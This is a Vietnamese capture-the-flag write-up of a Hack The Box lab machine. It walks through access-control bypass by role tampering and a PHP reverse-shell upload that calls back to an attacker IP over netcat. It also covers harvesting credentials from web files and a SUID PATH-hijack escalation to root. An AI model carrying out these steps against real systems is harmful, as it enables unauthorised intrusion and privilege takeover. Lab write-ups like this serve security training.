> Trong target này, ta sẽ tập trung vào việc lộ thông tin (Information Disclosure) kiểm soát truy cập lỏng lẻo (Broken Access Control).
###### Information Disclosure là lỗ hổng mà khi website vô tình để lộ thông tin nhạy cảm cho người dùng.
###### Broken Access Control là lỗ hổng khi cho phép người dùng bình thường truy cập vào dữ liệu và các chức năng (sửa, xóa file dữ liệu) mà bình thường không được phép.
### 1. Kiểm tra thông tin target
###### IP: 10.129.251.39
##### + Kiểm tra cổng và dịch vụ: 
` nmap -sC -sV 10.129.251.39 `
##### => 22/tcp ssh OpenSSH: Kết nối từ xa đến máy chủ.
##### => 80/tcp http Apache httpd: Web Server
##### + Truy cập trang web với địa chỉ `http://10.129.251.39`
##### => Một trang web tĩnh
##### + Cuối trang có tên miền và tên tài khoản: `admin@megacorp.com` và dòng tin nhắn `...Please login to get access to the service.`
##### => Trang web này sẽ có login.
### 2. Tiến hành tìm kiếm lỗ hổng
##### + Đầu tiên phải tiếp cận thụ động (Passive Recon):
##### + Sử dụng BurpSuite để xác định các lỗ hổng của trang web, kiểm tra cấu trúc, chức năng của trang web và không kích hoạt các cơ chế bảo mật hay cảnh báo.
##### + Khởi động BurpSuite, tắt intercept trong proxy.
##### + Cấu hình trình duyệt để gửi traffic thông qua proxy (vào setting search proxy, vào setting, set manual proxyconfiguration)
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/f39e631a-555a-4ec3-b79e-343e9e48701d)
##### + Refresh lại trang web địa chỉ target, nếu BurpSuite hiện lên yêu cầu forward request => thành công.
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/5b892f85-8382-46d4-a3bf-fbb1d34daac5)
##### + Forward Request, vào phần site map trên BurpSuite, thấy: 
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/1a382394-fef1-4c48-b3a9-0768123246b6)
##### => `/cdn-cgi/login/script.js` là một directory login cần chú ý đến.
##### => truy cập trang web với địa chỉ `http://10.129.251.39/cdn-cgi/login`
##### + Ta sẽ được một trang login.
##### + Đàu tiên thử `Login as Guest`
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/81920b74-b04e-41e1-88dc-2455a42a499f)
##### + Kiểm tra thử các các trường trong trang web, thấy trong phần `account` có url như sau: 
` http://10.129.251.39/cdi-cgi/login/admin.php?content=account&id=2 `
##### => id của user guest = 2; thử các số khác thì thấy id = 1 là của admin.
##### + Khi vào phàn `Uploads`, yêu cầu user là super admins
##### + Inspect trang (F12), vào phần storage, role của user hiện tại là `guest`, đổi thành `admin`. Sau đó Refresh page:
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/735e9023-8a41-437b-aeda-7a5f28cd6c56)
##### => truy cập vào trang upload có phần được sử dụng để upload ảnh, tuy nhiên có thể upload các file thực thi nhằm chiếm quyền reverse shell.
### 3. Tiến hành khai thác lỗ hổng
##### + Tiến hành đẩy một file php lên để thực hiện reverse-shell:
##### + Sử dụng một file `php-reverse-shell.php `có sẵn trong máy; thay đổi địa chỉ IP và port dùng để lắng nghe: 
```
...
$ip = "10.10.14.13";
$port = 1234;
...
```
##### + Upload lên web, sau đó cần tìm thư mục chứa file uploads đó, bật netcat và yêu cầu request từ file đã upload.
##### + Đầu tiên bruteforce thư mục bằng gobuster: 
```
gobuster dir --url http://10.129.251.39/ --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php
```
##### => tìm thấy thứ mục *uploads*
##### + Bật netcat với cổng 1234 (trùng với $port trong php-reverse-shell.php):
` nc -lvnp 1234 `
##### + Truy cập vào 10.129.251.39/uploads thì thông báo không có quyền truy cập thư mục:
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/1765a68f-3889-4d79-944f-ebb47ab3ce2e)
##### + Tuy vậy ta vẫn có thể request shell bằng cách truy cập chính xác file:
`http://10.129.251.39/uploads/php-reverse-shell.php`
##### + Vào netcat kiểm tra:
###### nếu vào kiểm tra netcat không thấy gì thì có thể file đã bị xóa => upload lại
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/c6fbe5ec-1246-4d01-ac6d-99e585070c34)
##### + Biết rằng ta đang reverse shell thông qua một web server (Apache) -> kiểm tra thư mục /var/www -> trong thư mục /var/www/html/cdn-cgi/login có các file .php
##### + Tìm kiếm password:
` cat * | grep -i passw* `
###### -i: bỏ qua phân biệt viết hoa viết thường
##### *=> username : admin ; password : MEGACORP_4dm1m!!*
##### + Kiểm tra file /etc/passwd xem có user nào có thể tái sử dụng pass:
##### => Có tài khoản Robert (thư mục */home/robert/*)
##### + Đăng nhập vào tài khoản Robert: `su robert`; ta nhận được lỗi như sau:
` su: must be run from a terminal `
##### => import terminal: 
` python3 -c ‘import pty;pty.spawn(“/bin/bash”)’ `
###### -c: cho phép cụ thể lệnh được thực thi bởi python
######	import pty: import pseudo-terminal module trong pyton, hữu dụng cho việc tương tác với terminal
######	pty.spawn(“/bin/bash”): spawns một bash shell mới, cung cấp một session shell tương tác 
###### + Tuy nhiên bị từ chối authen.
###### + Xem lại file trong /var/www/html/cdn-cgi/login => file *db.php* với mật khẩu *M3g4C0rpUs3r*. Sử dụng để đăng nhập tài khoản Robert và thành công!
###### flag trong file /home/robert/user.txt
### 4. Privillege Escalation
##### + Sau khi đăng nhập với tài khoản Robert thành công, kiểm tra id của user:
```
id
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```
##### => thuộc group *bugtracker*
##### + Tìm kiếm xem có file nào có thể thực thi bằng group trên không:
` find \ -group bugtracker 2>dev/null `
##### => /usr/bin/bugtracker
##### + Kiểm tra permission và loại file:
```
ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
-rwsr-xr-- 1 root bugtracker 8792 Jan 25 2020 /usr/bin/bugtracker
...
```
##### file có setuid (chữ s thứ tư)
###### setuid, hay SUID (Set owner User ID), một quyền hạn truy cập đặc biệt cho người dùng với một chức năng: một file với SUID luôn được thực thi dưới danh nghĩa người sở hữu file, bất kể người sử dụng lệnh. Nếu người sử hữu file không có quyền thực thi, thì sử dụng S. Trong trường hợp này, file ‘bugtracker’ được sở hữu bởi root và ta có thể thực thi như root vì có SUID.
##### + Chạy file: `./usr/bin/bugtracker`
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/e8e0ae3e-75b1-4646-b176-c48924f1df5c)
##### => có thể thấy chương trình cho phép người dùng input tên file vào và sau đó cat file đó ra. Tuy nhiên chương trình không cụ thể file path nên ta có thể khai thác lỗ hổng này qua lệnh *cat*.
##### Đầu tiên, vào thư mục /tmp, tạo file cat, ghi vào file '/bin/sh', thêm quyền thực thi cho file `chmod +x cat`
##### Để khai thác lỗ hổng này, ta thêm thư mục /tmp vào biến môi trường *PATH*: 
` export PATH=/tmp:$PATH `
###### PATH là một biến môi trường trên Hệ điều hành Unix,... giúp cụ thể một cụm thư mục chứa chương trình thực thi.
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/f15b7cc5-204a-4665-bf8d-e6246979adc4)
###### sau khi import, khi chạy một lệnh, hệ thống sẽ tìm đầu tiên ở trong thư mục /tmp. Nếu file thực thi không có trong đó, nó sẽ tiếp tục tìm kiếm ở các thư mục khác lần lượt theo ‘:’. 
![image](https://github.com/WildSaul/HTB_StartingPoint_FreeMachines_AllTiers/assets/155133173/1e0a6c37-25f8-4193-bf49-9b169304e071)
###### giải thích: file /usr/bin/bugtracker sử dụng lệnh cat, ép chương trình rằng khi chạy mà sử dụng lệnh cat, sẽ tìm kiếm file thực thi ở thư mục /tmp đầu tiên, và trong thư mục có file cat với chức năng tạo shell của người dùng đang thực thi nó, mà như giải thích ở phần suid, khi khởi chạy chương trình ta chạy dưới danh nghĩa root -> tạo shell root!
##### => vào shell root thành công!
###### flag của root nằm trong thư mục root.

